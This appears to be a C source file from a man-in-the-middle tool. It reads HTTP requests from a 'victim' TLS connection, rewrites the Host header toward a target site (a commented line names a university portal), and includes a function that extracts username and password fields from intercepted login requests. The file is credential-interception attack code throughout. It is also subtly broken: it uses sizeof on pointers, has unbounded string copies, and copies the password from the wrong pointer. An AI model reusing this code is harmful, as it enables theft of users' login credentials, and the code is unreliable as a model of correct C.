#include <string.h>
#include <openssl/ssl.h>
#include <err.h>

#include "SSL.h"
#include "HttpParser.h"

int construct_request(char* bufferToWrite, char* buffer, SSL* ssl_victim_fd)
{
    int totalBytes = 0, bytesRead;

    int headersEnd = 0, contentLength = 0, hostFound = 0, i;

    hostFound = (strlen(vhost) <= 0 ? 0 : 1);

    char* ptrToLength, *ptrToHeaderEnd, *ptrToHost;
    char lengthResult[20];

    while((bytesRead = ssl_read(ssl_victim_fd, buffer, sizeof(buffer))) > 0)
    {

        strcat(bufferToWrite, buffer);

        // check if we have reached the Header end
        if (!headersEnd && (ptrToHeaderEnd = strstr(bufferToWrite, "\r\n\r\n")) != NULL)
        {
            headersEnd = 1;
            if ((ptrToLength = strstr(bufferToWrite, "Content-Length: ")) == NULL)
            {
                // header found and no body => break
                if ((strlen(ptrToHeaderEnd) - 4) > 0)
                {
                    // removing characters out of request
                    ptrToHeaderEnd += 4;
                    for(i = 0; i < strlen(ptrToHeaderEnd); i++)
                        ptrToHeaderEnd[i] = '\0';
                }

                break;
            }

            ptrToLength += 16;
            for(i = 0; i < strlen(ptrToLength); i++)
            {
                if (ptrToLength[i] == '\r')
                    break;
                lengthResult[i] = ptrToLength[i];
            }
            contentLength = atoi(lengthResult);
        }

        if(contentLength > 0)
        {
            if ((strlen(ptrToHeaderEnd) - 4) >= contentLength)
                break;
        }
        totalBytes += bytesRead;
    }

    // find vhost in case it has not been set by the user
    if(!hostFound && (ptrToHost = strstr(bufferToWrite, "Host: ")) != NULL)
    {
        ptrToHost += 6;
        for(i = 0; i < strlen(ptrToHost); i++)
        {
            if (ptrToHost[i] == '\r')
                break;
            vhost[i] = ptrToHost[i];
        }
        hostFound = 1;
    }

    return totalBytes;
}

// Used for Debug purposes
// Problem with POST requests
char* change_host(char* request, char* new_host)
{
/*char bla[8000] = "\n\
GET / HTTP/1.1\n\
Host: 127.0.0.1\n\
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0\n\
Connection: keep-alive";*/


    char* a = strstr(request, "Host: ");
    char* b = strstr(request, "User-Agent: ");

    if(a == NULL || b == NULL)
        err(1, "No Host: or User-Agent:");

    char* temp = malloc(sizeof(b));
    strcpy(temp, b);

    //strcpy(a, "Host: susi.uni-sofia.bg\r\n");
    strcpy(a, "Host: ");
    strcat(a, vhost);
    strcat(a, "\r\n");

    strcat(a, temp);

    return request;

}

// Not used currently
void grep_credentials(char* request_body, char* username, char* password, char* vhost)
{
    char* uname = strstr(request_body, "txtUserName");
    char* pass = strstr(request_body, "txtPassword");

    if (uname == NULL || pass == NULL)
    {
        printf("No username or pass could be found");
        return;
    }
    int i;
    for(i = 0; i < strlen(uname); i++)
    {
        if (uname[i] == '&')
            break;
        username[i] = uname[i];
    }

    for(i = 0; i < strlen(pass); i++)
    {
        if (pass[i] == '&')
            break;
        password[i] = uname[i];
    }
}
